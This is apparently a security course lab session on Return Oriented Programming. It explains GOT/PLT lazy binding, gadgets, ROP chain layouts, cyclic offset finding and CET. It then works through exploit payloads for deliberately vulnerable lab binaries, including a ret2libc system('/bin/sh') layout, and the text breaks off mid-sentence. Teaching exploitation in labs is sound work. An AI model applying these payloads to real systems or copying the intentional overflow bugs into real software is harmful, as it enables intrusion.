---
linkTitle: Return Oriented Programming
type: docs
weight: 10
---

# Return Oriented Programming

## Table of Contents
* [Prerequisites](#prerequisites)
* [Recap - ASLR](#recap---aslr)
* [Solution - GOT and PLT](#solution---got-and-plt)
	* [Further Inspection](#further-inspection)
* [Return Oriented Programming (ROP)](#return-oriented-programming-rop)
	* [Motivation](#motivation)
	* [NOP Analogy](#nop-analogy)
* [Gadgets and ROP Chains](#gadgets-and-rop-chains)
	* [Code Execution](#code-execution)
	* [Changing Register Values](#changing-register-values)
	* [Clearing the Stack](#clearing-the-stack)
* [Some Useful Tricks](#some-useful-tricks)
	* [Memory Spraying](#memory-spraying)
	* [checksec in pwndbg](#checksec-in-pwndbg)
	* [Finding Gadgets in pwndbg](#finding-gadgets-in-pwndbg)
* [Further Reading](#further-reading)
	* [Linux x86 Program Start Up](#linux-x86-program-start-up)
	* [The .plt.sec Schema](#the-pltsec-schema)
		* [More about CET and endbr](#more-about-cet-and-endbr)
		* [TLDR](#tldr)
* [Putting it all Together: Demo](#putting-it-all-together-demo)
	* [Calling a Function](#calling-a-function)
	* [Calling a Function with Parameters](#calling-a-function-with-parameters)
	* [Calling Multiple Functions](#calling-multiple-functions)
		* [Finding Gadgets - ROPgadget](#finding-gadgets---ropgadget)
* [Challenges](#challenges)
	* [01. Tutorial - Bypass NX Stack with return-to-libc](#01-tutorial---bypass-nx-stack-with-return-to-libc)
	* [02. Challenge - ret-to-libc](#02-challenge---ret-to-libc)
	* [03. Challenge - no-ret-control](#03-challenge---no-ret-control)
	* [04. Challenge - ret-to-plt](#04-challenge---ret-to-plt)
	* [05. Challenge - gadget tutorial](#05-challenge---gadget-tutorial)
	* [06. Bonus Challenge - Echo service](#06-bonus-challenge---echo-service)
* [Conclusions](#conclusions)


## Prerequisites
In order to fully grasp the content of this session, you should have a good
understanding of the following topics, both theoretically and practically:
- Stack frame
- Shellcodes
- ASLR
- DEP
- `pwntools`

If you are unfamiliar with any of the above concepts or if your understanding of
them is fuzzy, go over their corresponding sessions once again, before you
proceed with the current session.


## Recap - ASLR
ASLR is not the only feature that prevents the compiler and the linker from
solving some relocations before the binary is actually running. Shared libraries
can also be combined in different ways. Thus, the time when the loader is
running is actually the first time you get to know the address of a shared
library. The ASLR feature is orthogonal to this - the loader could choose to
assign the addresses to libraries in a round-robin fashion, or could use ASLR to
assign them randomly.

Of course, we might be inclined to have the loader simply fix all relocations in
the code section after it loaded the libraries, but this breaks the memory
access protection of the `.text` section, which should only be **readable** and
**executable**.


## Solution - GOT and PLT
In order to solve this issue, we need another level of indirection. Through this
new level, all accesses to symbols located in shared libraries will read the
actual address from a table at runtime. This table is called the
**Global Offset Table (`.got`)**. The one who populates this table is the
loader. Note that this can work both for data accesses, as well as for function
calls. However, function calls are actually using a small stub (i.e., a few
instructions) stored in the **Procedure Linkage Table (`.plt`)**.

The PLT is responsible of finding the shared library function address when it is
first called (**lazy binding**), and writing it to a GOT entry. Note that the
function pointers are stored in `.got.plt`). The following calls use the
pre-resolved address. 

Let's take a quick look at the code generated for a shared library call. We'll
be using the binary compiled from the code below, which simply calls `puts()`.
```c
#include <stdio.h>

int main(void)
{
	puts("Hello world!");
	return 0;
}
```

After compiling this code, let's look at the call to `puts()`:
```
$ objdump -D -j .text -M intel hello | grep puts
80483e4:	e8 07 ff ff ff       	call   80482f0 <puts@plt>
```

If we look at the `.plt` section, we see that it starts at address `0x080482e0`,
right where the previous call jumps:
```
$ readelf --sections hello
[...]
  [12] .plt              PROGBITS        080482e0 0002e0 000040 04  AX  0   0 16
[...]
```

Now let's see how the code in `.plt` looks like:
```
$ objdump -D -j .plt -M intel hello | grep -A 3 '<puts@plt>'
080482f0 <puts@plt>:
 80482f0:	ff 25 00 a0 04 08    	jmp    DWORD PTR ds:0x804a000
 80482f6:	68 00 00 00 00       	push   0x0
 80482fb:	e9 e0 ff ff ff       	jmp    80482e0 <_init+0x30>
```

We see this code performing a jump to address `0x804a000` inside the data
section. Let's check the binary relocations for that location:
```
$ readelf --relocs hello
[...]
Relocation section '.rel.plt' at offset 0x298 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   puts
[...]
```

Ok, good, but what is actually stored at this address initially?
```
$ objdump -s -M intel -j .got.plt --start-address=0x0804a000 hello

hello:     file format elf32-i386
 
Contents of section .got.plt:
 804a000 f6820408 06830408 16830408           ............
```

We recognize `f6820408` (`0x80482f6`) as being the next instruction in the
`puts@plt` stub that we disassembled above. Which then pushes 0 in the stack and
calls 0x80482e0. This is the call to the one-time resolver, and it looks like
this:
```
$ objdump -D -j .plt -M intel hello | grep -A 3 '080482e0'

080482e0 <puts@plt-0x10>:
 80482e0:	ff 35 f8 9f 04 08    	push   DWORD PTR ds:0x8049ff8
 80482e6:	ff 25 fc 9f 04 08    	jmp    DWORD PTR ds:0x8049ffc
 80482ec:	00 00                	add    BYTE PTR [eax],al
```

What's going on here? What's actually happening is lazy binding - by convention
when the dynamic linker loads a library, it will put an identifier and
resolution function into known places in the GOT. Therefore, what happens is
roughly this: on the first call of a function, it falls through to call the
default stub, it simply jumps to the next instruction. The identifier is pushed
on the stack, the dynamic linker is called, which at that point has enough
information to figure out “hey, this program is trying to find the function
foo”. It will go ahead and find it, and then patch the address into the GOT such
that the next time the original PLT entry is called, it will load the actual
address of the function, rather than the lookup stub. Ingenious! 

### Further Inspection
Going further into the resolver is left as an exercise. You can use GDB to
inspect the address in `0x8049ffc`, and what happens when this jumps there.


## Return Oriented Programming (ROP)
### Motivation
In the previous sessions we discussed `ret2libc` attacks. The standard attack
was to perform an overwrite in the following way:
```
RET + 0x00:   addr of system
RET + 0x04:   JUNK
RET + 0x08:   address to desired command (e.g. '/bin/sh')
```

However, what happens when you need to call multiple functions? Say you need
to call `f1()` and then `f2(0xAB, 0xCD)`? The payload should be:
```
RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   JUNK (return address after f2 finishes: we don't care about what happens after the 2 functions are called)
RET + 0x0c:   0xAB (param1 of f2)
RET + 0x10:   0xCD (param2 of f2)
```

What about if we need to call `f1(0xAB, 0xCD)` and then `f2(0xEF, 0x42)`?
```
RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   0xAB (param1 of f1)
RET + 0x0c:   0xCD (param2 of f1) but this should also be 0xEF (param1 of f2)
RET + 0x10:   0x42 (param2 of f2)
```

### NOP Analogy
While `ret2libc` uses functions directly, ROP uses a finer level of code
execution: instruction groups. Let's explore an example:
```c
int main(void)
{
	char a[16];
	read(0, a, 100);
 
	return 0;
}
```

This code obviously suffers from a stack buffer overflow. The offset to the
return address is 24. So `DOWRD`s from offset 24 onwards will be popped from the
stack and executed. Remember the `NOP` sled concept from previous sessions?
These were long chains of `NOP` instructions (`\x90`) used to pad a payload for
alignment purposes. Since we can't add any new code to the program (_NX_ is
enabled) how could we simulate the effect of a `NOP` sled? Easy! Using return
instructions!

Let's find the `ret` instructions in a would-be binary:
```
$ objdump  -d hello -M intel | grep $'\t'ret
 80482dd:	c3                   	ret   
 804837a:	c3                   	ret   
 80483b7:	c3                   	ret   
 8048437:	c3                   	ret   
 8048444:	c3                   	ret   
 80484a9:	c3                   	ret   
 80484ad:	c3                   	ret   
 80484c6:	c3                   	ret
```

Any and all of these addresses will be ok. The payload could be the following:
```
RET + 0x00:   0x80482dd
RET + 0x04:   0x80482dd
RET + 0x08:   0x80482dd
RET + 0x0c:   0x80482dd
RET + 0x10:   0x80482dd
[...]
```
The above payload will run like so: the original `ret` (in the normal code flow)
will pop `RET+0x00` off the stack and jump to it. When `RET+0x00` gets popped,
the stack is automatically increased by 4 (on to the next value). The
instruction at `0x80482dd` is another `ret`, which does the same thing as before.
This goes on until another address that is not a `ret` is popped off the stack. 

In general, you can use the skeleton below to generate payloads:
```python
#! /usr/bin/python3
import struct, sys

def dw(i):
	return struct.pack("<I", i)

#TODO update count for your prog
pad_count_to_ret = 1
payload = b"X" * pad_count_to_ret

#TODO figure out the rop chain
payload += dw(0xcafebeef)
payload += dw(0xdeadc0de)

sys.stdout.write(payload.decode('ascii', 'replace'))
```


## Gadgets and ROP Chains
### Code Execution
Now that we've understood the basics of Return Oriented Programming, let's
actually do something useful. The building blocks of ROP payloads are called
**gadgets**. These are blocks of instructions that end with a `ret` instruction.
Here are some *gadgets* from the previous program:
```
0x8048443: pop ebp; ret
0x80484a7: pop edi; pop ebp; ret
0x8048441: mov ebp,esp; pop ebp; ret
0x80482da: pop eax; pop ebx; leave; ret
0x80484c3: pop ecx; pop ebx; leave; ret
```

By carefully placing addresses to such gadgets on the stack we can bring code
execution to almost any context we want. As an example, let's say we would like
to load `0x41424344` into `eax` and `0x61626364` into `ebx`. The payload should
look like this: 
```
RET + 0x00:   0x80482da  (pop eax; pop ebx; leave; ret)
RET + 0x04:   0x41424344
RET + 0x08:   0x61626364
RET + 0x0c:   0xAABBCCDD (instruction were the gadget's ret will jump to)
```
Let's see what exactly happens when this payload is given to our binary:
- First the ret addr is popped from the stack and execution goes there.
- At `pop eax`, `0x41424344` is loaded into `eax` and the stack is increased.
- At `pop ebx`, `0x61626364` is loaded into `ebx` and the stack is increased
again.
- At `leave`, two things actually happen: `mov esp, ebp; pop ebp`. So the stack
frame is decreased to the previous one (pointed by `ebp`) and `ebp` is updated
to the one before that. So `esp` will now be the old `ebp + 4`.
- At `ret`, the code flow will go to the instruction pointed to by `ebp+4`. This
implies that execution will not go to `0xAABBCCDD` but to some other address
that may or may not be in our control (depending on how much we can overflow on
the stack). If it is in our control we can overwrite that address with the rest
of the ROP chain.

### Changing Register Values
We have now seen how gadgets can be useful if we want the CPU to achieve a
certain state. This is particularly useful on other architectures such as ARM
and x86_64 where functions do not take parameters from the stack but from
registers. As an example, if we want to call `f1(0xAB, 0xCD, 0xEF)` on x86_64 we
first need to know the calling convention for the first three parameters (the
convention for placing the rest of the parameters can be found in
[table here](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions)):
```
1st param: RDI
2nd param: RSI
3rd param: RDX
```

Now we need to find gadgets for each of these parameters. Let's assume these 2
scenarios: Scenario 1:
```
0x400124:  pop rdi; pop rsi; ret
0x400235:  pop rdx; ret
0x400440:  f1()

Payload:
RET + 0x00:   0x400124
RET + 0x08:   val of RDI (0xAB)
RET + 0x10:   val of RSI (0xCD)
RET + 0x18:   0x400235
RET + 0x20:   val of RDX
RET + 0x28:   f1
```

Scenario 2:
```
0x400125:  pop rdi; ret
0x400252:  pop rsi; ret
0x400235:  pop rdx; ret
0x400440:  f1()

Payload:
RET + 0x00:   0x400125
RET + 0x08:   val of RDI (0xAB)
RET + 0x10:   0x400252
RET + 0x18:   val of RSI (0xCD)
RET + 0x20:   0x400235 
RET + 0x28:   val of RDX
RET + 0x30:   f1
```
Notice that because the architecture is 64 bits wide, the values on the stack
are not dwords but qwords (quad words: 8 bytes wide). Thus, the offsets between
the values in the payload are 8, instead of 4 (as they would be on a 32-bit
architecture).

### Clearing the Stack
The second use of gadgets is to clear the stack. Remember the issue we had in
the [Motivation](#motivation) section? Let's solve it using gadgets. We need to call
`f1(0xAB, 0xCD)` and then `f2(0xEF, 0x42)`. Our initial solution was:
```
RET + 0x00:   addr of f1
RET + 0x04:   addr of f2 (return address after f1 finishes)
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)  but this should also be 0xEF (param1 of f2)
RET + 0x10:   0x42 (param2 of f2) 
```

Note that now, for the sake of clarity, we're moving back to `x32`, so that
parameters are again passed on the stack.

The problem is that those parameters of `f1` are getting in the way of calling
`f2`. We need to find a `pop pop ret` gadget. The actual registers are not
important, as we only need to clear 2 values from the stack.
```
RET + 0x00:   addr of f1
RET + 0x04:   addr of (pop eax, pop ebx, ret) 
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)
RET + 0x10:   addr of f2
RET + 0x14:   JUNK
RET + 0x18:   0xEF (param1 of f2)
RET + 0x1c:   0x42 (param2 of f2) 
```

Now we can even call the next function `f3` if we repeat the trick:
```
RET + 0x00:   addr of f1
RET + 0x04:   addr of (pop eax, pop ebx, ret) 
RET + 0x08:   0xAB (param1 of f1)  
RET + 0x0c:   0xCD (param2 of f1)
RET + 0x10:   addr of f2
RET + 0x14:   addr of (pop eax, pop ebx, ret) 
RET + 0x18:   0xEF (param1 of f2)
RET + 0x1c:   0x42 (param2 of f2) 
RET + 0x20:   addr of f3
```


## Some Useful Tricks
### Memory Spraying
Let's take the following program:
```c
int main()
{
        int x, y ,z;
        char a,b,c;
        char buf[23];
        read(0, buf, 100);
 
        return 0;
}
```
It's a fairly simple overflow, but just how fast can you figure out the offset
to the return address? How much padding do you need? There is a shortcut that
you can use to figure this out in under 30 seconds without looking at the
*Assembly* code. 

A [De Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) is a
string of symbols out of a given alphabet in which each consecutive K symbols
only appear once in the whole string. If we can construct such a string out of
printable characters then we only need to know the Segmentation Fault address.
Converting it back to 4 bytes and searching for it in the initial string will
give us the exact offset to the return address.

[pwndbg]() can help you do this, using the
[cyclic](https://docs.pwntools.com/en/stable/util/cyclic.html) package from the
`pwnlib` library:
```
pwndbg> cyclic 100  # create a 100-character long De Bruijn sequence
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

pwndbg> cyclic -l aaa  # as addresses are 4 or 8  bytes long, you cannot search for a shorter pattern
[CRITICAL] Subpattern must be 4 bytes

pwndbg> cyclic -l faaa  # the offset of faaa in the above cyclic pattern is 20
20
```

```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
Starting program: /media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x080491d1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0x61616172 ('raaa')
 EDX  0xfbad2288
 EDI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616173 ('saaa')
 ESP  0x61616178 ('uaaa')
 EIP  0x61616174 ('taaa')    
──────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
Invalid address 0x61616174
[...]
pwndbg> cyclic -l 0x61616174
76
```

From the above commands we can deduce that EIP's offset relative to the start of
the buffer is 76, as the address that EIP points to is `0x61616174`, i.e.
`'taaa'`, which lies at offset 76 in the cyclic pattern we've just generated.

### checksec in pwndbg
```
pwndbg> checksec
[*] '/media/teo/2TB/Chestii/Poli/SSS/Exploit/sss-exploit/sessions/return-oriented-programming/hello'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Finding Gadgets in `pwndbg`
```
pwndbg> rop
Gadgets information
============================================================
0x080490fa : adc al, 0x68 ; sbb al, 0xc0 ; add al, 8 ; call eax
0x08049146 : adc byte ptr [eax + 0x68], dl ; sbb al, 0xc0 ; add al, 8 ; call edx
0x08049104 : adc cl, cl ; ret
0x0804909b : adc dword ptr [eax - 0x2e], -1 ; call dword ptr [eax - 0x73]
0x0804917c : add al, 8 ; add ecx, ecx ; ret
0x080490fe : add al, 8 ; call eax
0x0804914b : add al, 8 ; call edx
0x0804918c : add byte ptr [eax], al ; add byte ptr [eax], al ; endbr32 ; jmp 0x8049120
[...]

Unique gadgets found: 121

pwndbg> rop --grep "pop .* ; pop .* ; ret"  # you can perform a finer search using the --grep parameter and regular expressions
0x0804923d : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923c : jecxz 0x80491c1 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923b : jne 0x8049220 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804923e : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x0804923f : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x08049240 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049242 : pop edi ; pop ebp ; ret
0x08049241 : pop esi ; pop edi ; pop ebp ; ret

```


## Further Reading
### ROP Gadgets in `pwntools`
`pwntools` has a rather advanced
[ROP module](https://docs.pwntools.com/en/stable/rop/rop.html) that is capable
of crafting ROP attacks corresponding to various functions by creating
concatenating chains of ROP adresses, also known as ROP chains.

For this session, you won't need to use this module, but it may come in handy in
the future.

### Linux x86 Program Start Up
Notice that the `__libc_start_main` will always be present in the relocation
table. As you discovered in the session dedicated to
[executable file formats](https://github.com/hexcellents/sss-binary/tree/master/sessions/executable-file-formats),
this is the function called by the code from the `_start` label, which, in turn,
calls the `main()` function.

To find more details about the startup of a Linux x86 program, you can read
about it
[here](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html).

### The `.plt.sec` Schema
Let's go back to the small piece of code at the beginning of this lecture:
```c
#include <stdio.h>

int main(void)
{
	puts("Hello world!");
	return 0;
}
```

If we compile it with a more modern (later than 2019) version of even the most
"old-school" compilers, such as `gcc`, we will notice a slight (but actually
important) difference in the `.plt` schema used by the resulting binary file.
```
$ gcc -m32 -fno-PIC -no-pie hello.c -o hello
$ objdump -M intel -d hello
[...]
Disassembly of section .plt:

08049030 <.plt>:
 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
 804903c:       0f 1f 40 00             nop    DWORD PTR [eax+0x0]
 8049040:       f3 0f 1e fb             endbr32 
 8049044:       68 00 00 00 00          push   0x0
 8049049:       e9 e2 ff ff ff          jmp    8049030 <.plt>
 804904e:       66 90                   xchg   ax,ax
 8049050:       f3 0f 1e fb             endbr32 
 8049054:       68 08 00 00 00          push   0x8
 8049059:       e9 d2 ff ff ff          jmp    8049030 <.plt>
 804905e:       66 90                   xchg   ax,ax

Disassembly of section .plt.sec:

08049060 <puts@plt>:
 8049060:       f3 0f 1e fb             endbr32 
 8049064:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
 804906a:       66 0f 1f 44 00 00       nop    WORD PTR [eax+eax*1+0x0]
[...]
```

Now it seems there are two `.plt` sections: the "classic" `.plt` and a new
`.plt.sec` section. Moreover, the entries in the `.plt.sec` section are very
similar to those we've previously shown as being part of `.plt`. So why 2
`.plt`'s? And if the initial `.plt` entries have been moved over to `.plt.sec`,
what is the purpose of the `.plt` section now?

First, let's check the call to `puts()` itself:
```
$ objdump -D -j .text -M intel hello | grep puts
 80491b3:	e8 a8 fe ff ff       	call   8049060 <puts@plt>
```
So we see that the function being called now resides in the `.plt.sec` section.
What about the offset that `.plt.sec` redirect jumps to (i.e. `0x804c00c`)?
```
$ objdump -s -M intel -j .got.plt --start-address=0x0804c00c hello

hello:     file format elf32-i386

Contents of section .got.plt:
 804c00c 40900408 50900408                    @...P...
```

Similarly to what we did previously, we now see that `0x804c00c` points to
address `0x08049040`, which is this code inside the `.plt` section:
```
8049040:       f3 0f 1e fb             endbr32 
8049044:       68 00 00 00 00          push   0x0
8049049:       e9 e2 ff ff ff          jmp    8049030 <.plt>
804904e:       66 90                   xchg   ax,ax
```

So with the `.plt.sec` schema, there are 2 redirects: one from `.plt.sec` to
`.got` (or `.got.plt` to be more precise) and another from `.got.plt` to `.plt`.
Notice in the `.plt` stub above that, like before, `0x0` is pushed onto the
stack before the resolver is called, so that the dynamic linker can change it to
the actual address of `puts()` from libc.

So why use `.plt.sec` at all if in the end it looks like it does the same thing?
Well, `.plt.sec` is an x86-only security enhancement of the `.plt` section
(hence the `.sec` part of the name, duh...), that is used only when a security
enhancement feature called **CET (Control-flow Enforcement Technology)** is
enabled. In this comment, I'll explain what the feature is and why we have two
PLT sections if CET is enabled.

So, what does CET do? CET introduces a new restriction to indirect jump
instructions. In order to understand how CET works, let's assume that it is
enabled. Then, if you execute an indirect jump instruction, the processor
verifies that a special "landing pad" instruction, which is actually a
repurposed `NOP` instruction (now called `endbr32` or `endbr64`, as you can see
in the above snippets), is at the jump target. If the jump target does not start
with that instruction, the processor raises an exception instead of continuing
to execute code.

If CET is enabled, the compiler places `endbr` instructions to all locations
where indirect jumps may lead. This mechanism makes it extremely hard to
transfer the control to a middle of a function that is not supporsed to be a
indirect jump target, preventing certain types of attacks, such as ROP or JOP
(jump-oriented programming; very similar to ROP).

Now, let's explain why we have this extra PLT section for when CET is enabled.
Since you can indirectly jump to a PLT entry, we have to make PLT entries start
with an `endbr` instruction. The problem is there was no extra space for `endbr`
(which is 4 bytes long) in the old `.plt` entry schema, as the PLT entry is only
16 bytes long and all of them are already used.

In order to deal with the issue, each PLT entry was splt into two separate
entries. Remember that each PLT entry contains code to jump to an address read
from `.got.plt` **AND** code to resolve a dynamic symbol lazily. With the 2-PLT 
schema, the former code is written to `.plt.sec`, and the latter code is written
to `.plt`, as demonstrated above.

#### More about CET and `endbr`
- A more in-depth look at the inner workings of CET and the concept of the
**Shadow Stack** that it uses, can be found
[here](https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html)
and
[here](https://software.intel.com/content/www/us/en/develop/articles/technical-look-control-flow-enforcement-technology.html)
- The way `endbr` instructions interact with the CPU is explained
[here](https://cdrdv2.intel.com/v1/dl/getContent/631121), at page 38

#### TLDR
Lazy symbol resolution in the 2-PLT schema works in the usual way, except
that the regular `.plt` is now called `.plt.sec` and `.plt` is repurposed to
contain only code for lazy symbol resolution.


## Putting it all Together: Demo
Now that we've learned the theoretical aspects of what Return Oriented
Programming is, let's put everything in practice as part of a demo.

Navigate to the folder [00-demo](activities/00-demo). Notice that it contains
two executables, one compiled for 32 bits (`vuln`) and the other for 64 bits
(`vuln64`). TODO: diff

Looking at their source code (it's one and the same for both of them), we can
easily identify their vulnerability: the `reader` function reads (duh...) 128
bytes from `stdin` into a buffer whose capacity is only 64 bytes. So we'll be
able to overflow this buffer. We aim to do this in order to showcase the concept
of **code reuse**.

### Calling a Function
The most basic type of code reuse is calling a function. For this, we'll be
calling the `warcraft` function in the `vuln` and `vuln64` binaries mentioned
above. In order to do this, we'll need to know:
1. the offset of the return address inside our buffer
2. the address of the `warcraft` function inside the binary.

For all our exploits we'll be using the `exploit.py` script, which is also
available in the [00-demo](activities/00-demo) folder. Notice that `pwntools`
provides a functionality similar to `nm`, by which we can obtain the addresses
of various sybols in the binary (as long as it hasn't been stripped):
```python
e = ELF(filename)
warcraft_address = e.symbols[b"warcraft"]
```

As of now, requirement #2 mentioned above is complete. In order to also complete
the first requirement, we'll use `objdump` and check the `reader` function:
```
$ objdump -M intel -d vuln
08048529 <reader>:
 8048529:       55                      push   ebp
 804852a:       89 e5                   mov    ebp,esp
 804852c:       83 ec 40                sub    esp,0x40
 [...]
 804853c:       a1 40 a0 04 08          mov    eax,ds:0x804a040
 8048541:       50                      push   eax
 8048542:       68 80 00 00 00          push   0x80
 8048547:       8d 45 c0                lea    eax,[ebp-0x40]
 804854a:       50                      push   eax
 804854b:       e8 10 fe ff ff          call   8048360 <fgets@plt>
```
Our vulnerable buffer is the first parameter of `fgets`, which is at offset
`ebp - 0x40` i.e. `ebp - 64`. Which means that the offset of the return address
is `64 + 4 = 68` bytes into this buffer (remember how a stack frame looks like).

So, in order to call the `warcraft` function, we'll give our binary a payload
made up of a padding of 68 bytes, followed by the address of `warcraft`, written
in _little endian_ representation, which can be written like this:
```python
offset = 0x40 + 4
payload = offset * b"A" + pack(warcraft_address)
```
Now our exploit is done. In order to perform this exploit on `vuln64`, simply
run `objdump` on this binary and remember that the length of a pointer on a
64-bit architecture is 8 bytes, which means that the offset of the return
address is going to be `rbp + 8`.

One thing to keep in mind is that you are by no means required to use addresses
that point to the beginning of functions in your payloads. You can use any valid
address from the `.text` section and the exploit should work just fine in
executing code from the address you provide it.

Now on to our next scenario: what if the function we're calling requires a
parameter?

### Calling a Function with Parameters
Let's first look at the stack of a function when it's called "normally", i.e.
with a `call` instruction. Let's use the `overwatch` function in `vuln.c` as an
example. The picture below shows where its parameter is placed.

![Overwatch Stack](assets/overwatch_stack_simple.png)

Furthermore, as expected, the function retrieves its parameter from address
`ebp + 8`, as shown above. How can we craft a payload so that, upon entering the
function, the required `0xdeadbeef` parameter is where the function expects it
to be?

We'll obviously need to place `0xdeadbeef` on the stack (in little endian
representation, of course), but where? After the function's preamble
(`push ebp; mov esp, ebp`), `ebp` points to the location where the previous
stack pointer it saved. Above it, the function expects to find its return
address. Thus, we need to write 4 padding bytes in its place. The next 4 bytes
are the first parameter. Just for reference, the next 4 bytes (`ebp + 12`) are
the second parameter and so on. So, in order to call `overwatch` with the
`0xdeadbeef` parameter, the payload would look like this:
```python
payload = offset * b"A" + pack(overwatch_address) + 4 * b"B" + pack(0xdeadbeef)
```

Take a look at those 4 `B`'s in the payload above. We agreed that they are
`overwatch`'s expected return address. So if we wanted to call another function,
we would only need to replace them with that function's address. Pretty simple,
right? But what if we wanted to call a third function? Well, then we would need
to overwrite the next 4 bytes in our payload with a third address. Easy! But now
we have actually run into trouble: the next 4 bytes are `overwatch`'s parameter.
In this situation it looks like we **either** call `overwatch` or we call a third
function. Not cool. In this case, `overwatch`s stack would look like this:

![Overwatch Stack with Conflicting Parameter/Address](assets/overwatch_stack_conflict.png)

It seems we need another mechanism so that we can call **all 3 functions** with
all their correct parameters. Enter ROPs!

### Calling Multiple Functions
What we need in order to solve the dilemma presented above is a means by which
to **remove** `overwatch`'s parameter (i.e. `0xdeadbeef`) from the stack once
the function is finished. We know that the `pop` instruction is good for
removing stuff from the stack. So what we need is to execute the following two
instructions:
```assembly
pop <any_register>
ret
```

Since `ret` is equivalent to `pop eip`, the above code removes `0xdeadbeef` from
the stack and places the instruction pointer (`eip`) at the address lying on the
stack above `0xdeadbeef`. One thing to keep in mind is that now we're only
interested in clearing the stack, so `pop` can be used with any 32 bit register.

As a result, `overwatch`'s stack should look like the one in the image below.
Notice there are no more conflicts now. Hurray!

![Overwatch Stack without Conflicting Parameters and Addresses](assets/overwatch_stack_no_conflict.png)

#### Finding Gadgets - `ROPgadget`
The `pop; ret` instructions above are called a **gadget**, i.e. a small group of
**consecutive** instructions that ends in `ret` and which can be used to alter
the execution of a given program. Since all binaries contain a `.text` section,
which is made up of instructions, all binaries contain gadgets. Lots of them.

The tool that we're going to use in order to find such gadgets is called
`ROPgadget`. It is already installed in the Kali VM and if you're working on
another environment, you can install it by following the instructions in the
tool's [Github repo](https://github.com/JonathanSalwan/ROPgadget).

In order to run `ROPgadget` from your terminal, you need to specify a binary
file to it using the `--binary` parameter. It is also recommended (if you know
what gadgets you're looking for) to filter those you need using the `--only`
parameter. As a result, in order to obtain a `pop; ret` gadget, we need to run
the following command:
```bash
$ ROPgadget --binary vuln --only "pop|ret"
Gadgets information
============================================================
0x080485eb : pop ebp ; ret
0x080485e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048331 : pop ebx ; ret
0x080485ea : pop edi ; pop ebp ; ret
0x080485e9 : pop esi ; pop edi ; pop ebp ; ret
0x0804831a : ret
0x0804819c : ret 0x3e41
0x0804844e : ret 0xeac1
```

Thus, the payload needed in order to call both `overwatch` and `warcraft` is the
one showcased below, with `pop_ret_gadget_address` being set to `0x08048331`
from the output above.
```python
payload = offset * b"A" + pack(overwatch_address) + pack(pop_ret_gadget_address)
	+ pack(0xdeadbeef) + pack(warcraft_address)
```

Notice this yet is another example of **code reuse** since we're reusing various
chunks of instructions already present in our binary.


## Challenges
### 01. Tutorial - Bypass NX Stack with return-to-libc

Go to the [01-tutorial-ret-to-libc/](activities/01-tutorial-ret-to-libc/src/)
folder.

In the previous sessions we used stack overflow vulnerabilities to inject new
code into a running process (on its stack) and redirect execution to it. This
attack is easily defeated by making the stack, together with any other memory
page that can be modified, non-executable. This is achieved by setting the
**NX** bit in the page table of the current process.

We will try to bypass this protection for the `01-tutorial-ret-to-libc/src/auth`
binary in the lab archive. For now, disable ASLR in the a new shell:
```
$ setarch $(uname -m) -R /bin/bash
```

Let's take a look at the program headers and confirm that the stack is no longer
executable. We only have read and write (RW) permissions for the stack area.
The auth binary requires the `libssl1.0.0:i386` Debian package to work. You can
find `libssl1.0.0:i386` Debian package
[here](https://packages.debian.org/jessie/i386/libssl1.0.0/download).

First, let's check that *NX* bit we mentioned earlier:
```
$ checksec auth
    [...]
    NX:       NX enabled
    [...]
```

For completeness, lets check that there is indeed a buffer (stack) overflow vulnerability.
```
$ python2.7 -c 'print "A" * 1357' | ltrace -i ./auth
TODO
```

Check the source file - the buffer length is 1337 bytes. There should be a base
pointer and the `main()`'s return address just before it on the stack. There is
also some alignment involved, but we can easily try a few lengths to get the
right position of the return address. Seems to be 1337 + 16 followed by the
return address for this case. You can, of course, determine the distance between
the buffer's start address and the frame's return address exactly using objdump,
but we will leave that as an exercise.

We can now jump anywhere. Unfortunately, we cannot put a shellcode in the buffer
and jump into it because the stack is non-executable now. Lets try it with a few
